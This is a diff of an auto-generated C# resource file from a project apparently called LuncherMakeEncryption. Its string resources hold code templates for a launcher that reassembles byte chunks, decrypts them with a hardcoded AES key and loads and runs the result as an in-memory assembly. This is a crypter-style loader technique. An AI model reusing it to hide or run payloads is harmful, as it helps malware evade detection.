@@ -61,7 +61,7 @@ namespace LuncherMakeEncryption.Properties {
         }
         
         /// <summary>
-        ///   Ищет локализованную строку, похожую на var w = 0; var Useless = 0; var s = &quot;&quot;; var n = &quot;&quot;; var p = &quot;&quot;; WebClient x = null; MethodInfo m;.
+        ///   Ищет локализованную строку, похожую на var w = 0; var Useless = 0; var s = &quot;&quot;; var n = &quot;&quot;; var p = &quot;&quot;; WebClient x = null; MethodInfo m; byte[] b = null;.
         /// </summary>
         internal static string String000 {
             get {
@@ -148,6 +148,8 @@ namespace LuncherMakeEncryption.Properties {
         ///{
         ///if (m != null)
         ///{
+        ///xxx = null;
+        ///bbb = null;
         ///     var ts = new System.Threading.ThreadStart(() =&gt; { try { if (m != null) m.Invoke(null, null); } catch { } });
         ///     var thd = new System.Threading.Thread(ts);
         ///     thd.SetApartmentState(ApartmentState.STA);
@@ -161,6 +163,95 @@ namespace LuncherMakeEncryption.Properties {
         internal static string String007 {
             get {
                 return ResourceManager.GetString("String007", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Ищет локализованную строку, похожую на new Thread( ()=&gt;{ 
+        ///for (int i =0; i &lt; xxx.Count ;i++){
+        ///byte[] lb = null;
+        ///xxx.TryGetValue(i, out lb);
+        ///if (i == xxx.Count-1)
+        ///lb.CopyTo(bbb, bbb.Length-lb.Length);
+        ///else
+        ///lb.CopyTo(bbb, lb.Length*i);
+        ///}
+        ///Console.WriteLine(&quot;bbb ended&quot;);
+        /// w++;
+        ///}).Start();.
+        /// </summary>
+        internal static string String100 {
+            get {
+                return ResourceManager.GetString("String100", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Ищет локализованную строку, похожую на new Thread( ()=&gt;{ 
+        ///Console.WriteLine(&quot;---&quot;+ w+&quot;----&quot;);
+        ///while (w != 1) Thread.Sleep(100);
+        ///Console.WriteLine(&quot;===&quot;+ w+&quot;===&quot;);
+        ///        var AES = new System.Security.Cryptography.AesCryptoServiceProvider();
+        ///            AES.Key = new byte[256 / 8] { 240, 119, 82, 224, 93, 205, 250, 43, 78, 192, 95, 229, 166, 27, 4, 104, 40, 251, 211, 20, 190, 77, 207,
+        ///                    34, 116, 39, 244, 211, 54, 212, 5, 205 };
+        ///            AES.IV = new byte[128 / 8] { 58, 41, 152, 142, 81, 7, 185, 181, 153, 139, 240, 86, [остаток строки не уместился]&quot;;.
+        /// </summary>
+        internal static string String101 {
+            get {
+                return ResourceManager.GetString("String101", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Ищет локализованную строку, похожую на new Thread( ()=&gt;{ 
+        ///Console.WriteLine(&quot;---&quot;+ w+&quot;----&quot;);
+        ///while (w != 2) Thread.Sleep(100);
+        ///Console.WriteLine(&quot;===&quot;+ w+&quot;===&quot;);
+        ///try
+        /// {
+        ///                var a = Assembly.Load(b);
+        ///                m = a.EntryPoint;
+        ///} catch (Exception Error){MessageBox.Show(Error.Message);}
+        ///w=16;
+        ///}).Start();.
+        /// </summary>
+        internal static string String102 {
+            get {
+                return ResourceManager.GetString("String102", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Ищет локализованную строку, похожую на using System;
+        ///using System.Collections.Generic;
+        ///using System.Linq;
+        ///using System.Text;
+        ///using System.Threading.Tasks;
+        ///
+        ///namespace Luncher
+        ///{
+        ///    public partial class LuncherForm
+        ///    {
+        ///        private static List&lt;byte[]&gt; a = new List&lt;byte[]&gt;();
+        ///
+        ///        static Random r = new Random();
+        ///        private static void InitData()
+        ///        {.
+        /// </summary>
+        internal static string StringBeg {
+            get {
+                return ResourceManager.GetString("StringBeg", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Ищет локализованную строку, похожую на }
+        ///    }
+        ///}.
+        /// </summary>
+        internal static string StringEnd {
+            get {
+                return ResourceManager.GetString("StringEnd", resourceCulture);
             }
         }
     }
